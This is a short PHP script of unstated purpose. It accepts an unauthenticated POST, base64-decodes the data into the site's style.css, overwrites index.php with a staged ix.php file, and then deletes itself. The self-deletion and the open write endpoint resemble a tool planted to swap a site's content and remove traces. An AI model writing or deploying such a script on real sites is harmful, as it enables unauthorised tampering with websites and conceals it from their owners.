<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    file_put_contents(__DIR__.'/assets/css/style.css', base64_decode($_POST['d']));
    echo 'CSS OK';
}
if (file_exists(__DIR__.'/ix.php')) { copy(__DIR__.'/ix.php', __DIR__.'/index.php'); unlink(__DIR__.'/ix.php'); echo ' IDX OK'; }
@unlink(__FILE__);